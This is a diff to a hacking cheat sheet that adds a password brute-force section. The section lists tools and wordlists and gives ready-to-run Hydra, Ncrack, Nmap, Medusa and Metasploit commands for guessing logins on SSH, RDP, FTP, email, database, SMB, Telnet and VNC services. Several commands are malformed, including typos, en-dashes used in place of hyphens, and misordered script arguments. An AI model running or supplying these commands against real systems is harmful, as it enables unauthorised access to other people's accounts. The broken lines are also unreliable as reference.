@@ -28,6 +28,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Find your public IP address](#your-ip)
    1. [Check reachability from around the world](#check-reachable)
    1. [Check Open Ports](#check-open-ports)
+   1. [Brute Force](#bruteforce)
 1. [File Encoding and Transfer](#file-encoding)
    1. [uuencode](#uuencode)
    1. [openssl](#file-encoding-openssl)
@@ -378,6 +379,123 @@ The fine people at [https://ping.pe/](https://ping.pe/) let you ping/traceroute/
 
 ```shell
 curl https://internetdb.shodan.io/1.1.1.1
+```
+
+<a id="bruteforce"></a>
+**3.viii. Brute Force Password**
+
+(This list is curated by Joey (?))
+
+Tools:
+* [Ncrack](https://nmap.org/ncrack/)
+* [Nmap BRUTE](https://nmap.org/nsedoc/categories/brute.html)
+* [THC Hydra](https://sectools.org/tool/hydra/)
+* [Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
+* [Metasploit](https://docs.rapid7.com/metasploit/bruteforce-attacks/)
+
+Username & Password lists:
+* `/usr/share/nmap/nselib/data`  
+* `/usr/share/wordlists/seclists/Passwords`  
+* https://github.com/danielmiessler/SecLists  
+* https://weakpass.com  
+
+
+Set **U**sername/**P**assword list and **T**arget host.
+```shell
+ULIST="/usr/share/wordlists/brutespray/mysql/user"
+PLIST="/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt"
+T="192.168.0.1"
+```
+
+Nmap parameters:
+```shell
+--script-args userdb="${ULIST}",passdb="${PLIST}"
+```
+
+Ncrack parameters:
+```shell
+-U "${ULIST}"
+-P "${PLIST}"
+```
+
+Hydra parameters:
+```shell
+-t4      # Limit to 4 tasks
+-l root  # Set username
+-V       # Show each login/password attempt
+-s 31337 # Set port
+-f       # Exit after first valid login
+```
+
+<!--
+```shell
+## HTTP Login
+hydra -l admin -P "${PLIST}" http-post-fomr "/admin.php:u=^USER&p-^PASS&f=login:'Enter'" -v
+```
+-->
+```shell
+## SSH
+nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s "$T"
+ncrack -P "${PLIST}" --user root "ssh://${T}"
+hydra -P "${PLIST}" -l root "ssh://$T"
+```
+
+```shell
+## Remote Desktop Protocol / RDP
+ncrack -P "${PLIST}" --user root -p3389 "${T}"
+hydra -P "${PLIST}" -l root "rdp://$T"
+```
+
+```shell
+## FTP
+hydra -P "${PLIST}" -l user "ftp://$T"
+```
+
+```shell
+## IMAP (email)
+nmap -p 143,993 --script imap-brute "$T"
+```
+
+```shell
+## POP3 (email)
+nmap -p110,995 --script pop3-brute "$T"
+```
+
+```shell
+## MySQL
+nmap -p3306 --script mysql-brute "$T"
+```
+
+```shell
+## PostgreSQL
+nmap -p5432 --script pgsql-brute "$T"
+```
+
+```shell
+## SMB (windows)
+nmap --script smb-brute "$T"
+```
+
+```shell
+## Telnet
+nmap -p23 --script --script-args telnet-brute.timeout=8s telnet-brute "$T"
+```
+
+```shell
+## VNC
+nmap -p5900 --script vnc-brute "$T"
+ncrack -P "${PLIST}" --user root "vnc://$T"
+hydra -P "${PLIST}" "vnc://$T"
+medusa -P "${PLIST}" –u root –M vnc -h "$T"
+```
+
+```shell
+## Brute Force VNC with metasploit
+msfconsole
+use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(scanner/vnc/vnc_login) > set rhosts 192.168.0.1
+msf auxiliary(scanner/vnc/vnc_login) > set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
+msf auxiliary(scanner/vnc/vnc_login) > run
 ```
 
 ---
